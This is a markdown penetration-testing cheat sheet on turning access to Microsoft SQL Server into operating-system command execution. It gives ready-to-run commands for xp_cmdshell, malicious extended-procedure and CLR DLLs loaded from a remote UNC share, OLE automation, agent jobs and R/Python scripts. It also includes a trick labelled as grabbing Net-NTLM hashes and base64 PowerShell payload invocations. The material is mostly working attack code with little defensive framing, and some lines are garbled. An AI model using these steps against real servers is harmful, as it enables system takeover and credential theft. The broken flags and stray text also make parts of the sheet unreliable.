# xp_cmdshell

* Disabled by default since SQL Server 2005
* Executed with the privileges of SQL Server service account
* Synchronous
* `sysadmin` privileges are required

If uninstalled:
```
sp_addextendedproc 'xp_cmdshell','xplog70.dll'
```

If disabled:
```
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
```

Exploitation:
```
EXEC master..xp_cmdshell 'whoami'
```

Nishang:
```
Execute-Command-MSSQL -ComputerName instance -UserName sa -Password pw
```

PowerUpSQL:
```
Invoke-SQLOSCmd -Username sa -Password pw -Instance instance -Command whoami
```

# Custom Extended Stored Procedures

* DLL which acts as an extension to SQL server
* `sysadmin` privileges are required to register
* Executes with the privileges of the service account
* DLL can have any file extension
* Can also be loaded from UNC path or Webdav

Sample DLL Code:
> https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp
> https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure

If `xp_calc.dll` has a function called `xp_calc`:

```
sp_addextendedproc 'xp_calc', 'C:\mydll\xp_calc.dll'
EXEC xp_calc
sp_dropextendedproc 'xp_calc'
```

```
Create-SQLFileXpDll -OutFile C:\fileserver\xp_calc.dll -Command "calc.exe" -ExportName xp_calc
Get-SQLQuery -UserName sa -Password pw -Instance instance -Query "sp_addextendedproc 'xp_calc', '\\192.168.15.2\fileserver\xp_calc.dll'"
Get-SQLQuery -UserName sa -Password Password1 -Instance instance -Query "EXEC xp_calc"
```

Listing existing:

```
Get-SQLStoredProcedureXP -Instance instance -Verbose
```

# Custom CLR Assemblies

* CLR (Common Language Runtime) is a run-time environment provided by the .NET framework
* SQL Server CLR integration allows writing stored procedures and other things by importing a DLL.
* CLR integration is off by default
* `sysadmin` privileges are required by-default.
* Create assembly, Alter assembly or DDL_Admin role can also use it.
* Execution takes place with privileges of the service account
* DLL can be loaded from a local path or a UNC path

> https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integrationv

> https://blog.netspi.com/attacking-sql-server-clr-assemblies/

Create DLL:
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library C:\Users\labuser\Desktop\cmd_exec.cs
```

Enable CLR:
```
use msdb
GO
-- Enable show advanced options on the server
sp_configure 'show advanced options',1
RECONFIGURE
GO
-- Enable clr on the server
sp_configure 'clr enabled',1
RECONFIGURE
GO
```

Create DLL:
```
Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir C:\Users\labuser\Desktop
```

Import the assembly from file:
```
CREATE ASSEMBLY my_assembly FROM '\\192.168.15.2\fileserver\cmd_exec.dll' WITH PERMISSION_SET = UNSAFE;
GO
```

Import the assembly from string:
```
CREATE ASSEMBLY [NMfsa] AUTHORIZATION [dbo] FROM 0x4D5A90......
```

Link the assembly to a stored procedure
```
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
GO
```

Execution:
```
cmd_exec 'whoami'
```

```
Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command "whoami" -Verbose
```

Cleanup:
```
DROP PROCEDURE cmd_exec
DROP ASSEMBLY my_assembly
```

List all CLR assemblies:
```
Get-SQLStoredProcedureCLR -Instance instance -Verbose
```

# OLE Automation Procedure

* Disabled by default
* `sysadmin` privileges are required by-default.
* Execution takes place with privileges of the service account
* Execute privileges on sp_OACreate and sp_OAMethod can also be used for execution.

> https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option

Enabling:
```
sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
sp_configure 'Ole Automation Procedures', 1;
GO
RECONFIGURE;
GO
```

Execute:
```
DECLARE @output INT
DECLARE @ProgramToRun VARCHAR(255)
SET @ProgramToRun = 'Run("calc.exe")'
EXEC sp_oacreate 'wScript.Shell', @output out
EXEC sp_oamethod @output, @ProgramToRun
EXEC sp_oadestroy @output
```

```
Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command "whoami" -Verbose
```

Example: Sets SecurityDescriptor of ftp.exe to everyone:
```
-- Declare variables used to reference the objects
DECLARE @objLocator int,@objWmi int,@objPermiss int,@objFull int;

-- Create a WbemScripting.SWbemLocator object
EXEC sp_OACreate 'WbemScripting.SWbemLocator',@objLocator OUTPUT;

-- Use the SWbemLocator object's ConnectServer() method to connect to the
-- local WMI server. The connection will be to the 'root\cimv2' namespace
EXEC sp_OAMethod @objLocator,
'ConnectServer',@objWmi OUTPUT,'.','root\cimv2';

-- Retrieve an SWbemObject that represents the requested object
-- In this case, a Win32_LogicalFileSecuritySetting object for 'ftp.exe'
EXEC sp_OAMethod @objWmi,
'Get',@objPermiss OUTPUT,
'Win32_LogicalFileSecuritySetting.Path=''ftp.exe''';

-- Create an empty SecurityDescriptor
EXEC sp_OAMethod @objWmi,'Get',@objFull
OUTPUT,'Win32_SecurityDescriptor';

-- Set the SecurityDescriptor's ControlFlags property to
-- '4' (SE_DACL_PRESENT)
EXEC sp_OASetProperty @objFull,'ControlFlags',4;
-- Set the file security setting object's security descriptor to the
new

-- SecurityDescriptor object
EXEC sp_OAMethod @objPermiss,'SetSecurityDescriptor',NULL,@objFull;
```
> https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/

# Agent Jobs (CmdExec, PowerShell, ActiveX etc.)

* job can be scheduled, executed in response to alerts or by using `sp_start_job` stored procedure
* Needs `sysadmin` role to `create` a job.
* Non-sysadmin users with the `SQLAgentUserRole`, `SQLAgentReaderRole`, and `SQLAgentOperatorRole` fixed database roles in the `msdb` database can also be used.
* The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured.

> https://docs.microsoft.com/en-us/sql/ssms/agent/sql-server-agent

## Steps
* `xp_startservice` - Start the SQL Server Agent service
* `sp_add_job` - Create Job
* `sp_add_jobstep` - Add job step
* `sp_start_job` - Run Job
* `sp_delete_job` - Delete Job

## Listing all Jobs

```
SELECT
job.job_id, notify_level_email, name, enabled,
description, step_name, command, server, database_name
FROM
msdb.dbo.sysjobs job
INNER JOIN
msdb.dbo.sysjobsteps steps
ON
job.job_id = steps.job_id
```

> https://serverfault.com/a/14569

## Interesting subsystems (job types):
### PowerShell

```
USE msdb
EXEC dbo.sp_add_job @job_name = N'PSJob'

EXEC sp_add_jobstep @job_name = N'PSJob', @step_name =
N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -noexit ps', @retry_attempts = 1, @retry_interval = 5

EXEC dbo.sp_add_jobserver @job_name = N'PSJob'

EXEC dbo.sp_start_job N'PSJob'
-- EXEC dbo.sp_delete_job @job_name = N'PSJob'
```
> https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution

### CmdExec

```
USE msdb
EXEC dbo.sp_add_job @job_name = N'cmdjob'

EXEC sp_add_jobstep @job_name = N'cmdjob', @step_name = N'test_cmd_name1', @subsystem = N'cmdexec', @command = N'cmd.exe /k calc', @retry_attempts = 1, @retry_interval = 5

EXEC dbo.sp_add_jobserver @job_name = N'cmdjob'

EXEC dbo.sp_start_job N'cmdjob';
-- EXEC dbo.sp_delete_job @job_name = N'cmdJob'
```

### Microsoft ActiveX Script (VBScript and Jscript)
### SSIS (SQL Server Integrated Services)

## PowerUpSQL

```
Invoke-SQLOSCmdAgentJob –Subsystem PowerShell -Username
sa -Password pw -Instance instance -Command
"powershell -e <base64encodedscript>" -Verbose
-Subsystem CmdExec
-ubsystem VBScript
-Subsystem Jscript
```

```
Get-SQLAgentJob -Instance instance -username sa -Password pw -Verboe]se
```

# External Scripting

* R introduced in SQL Server 2016
* Python introduced in SQL Server 2017
* Runtime environments must be installed as a prerequisite. Not on by default. Needs SQL server service restart.
* Needs `sysadmin` privileges to be enabled and executed.
* Runs with privileges of a dynamically created Windows user account (member of the `SQLRUserGroup`).

> https://docs.microsoft.com/en-us/sql/advanced-analytics/tutorials/rtsql-using-r-code-in-transact-sql-quickstart

> https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server

Executing commands with R:
```
sp_configure 'external scripts enabled'
GO
EXEC sp_execute_external_script
@language=N'R',
@script=N'OutputDataSet <- data.frame(system("cmd.exe
/c dir",intern=T))'
WITH RESULT SETS (([cmd_out] text));
GO
```

Grab Net-NTLM hashes with R:
```
@script=N'.libPaths("\\\\testhost\\foo\\bar");library("0mgh4x")'
```

Using shell instead of system:
```
@script=N'OutputDataSet <- data.frame(shell("dir",intern=T))'
```
> https://pastebin.com/zBDnzELT

Executing commands with Python:
```
EXEC sp_execute_external_script
@language =N'Python',
@script=N'import subprocess
p = subprocess.Popen("cmd.exe /c whoami",
stdout=subprocess.PIPE)
OutputDataSet = pandas.DataFrame([str(p.stdout.read(),
"utf-8")])'
WITH RESULT SETS (([cmd_out] nvarchar(max)))
Reference:
```

> https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5
> https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server

PowerUpSQL:
```
Invoke-SQLOSCmdR -Username sa -Password pw -Instance instance -Command "powershell -e <base64encodedscript>" -Verbose
Invoke-SQLOSCmdPython -Username sa -Password pw -Instance instance -Command "powershell -e <base64encodedscript>" -Verbose
```

# Registry Autoruns
# File Autoruns
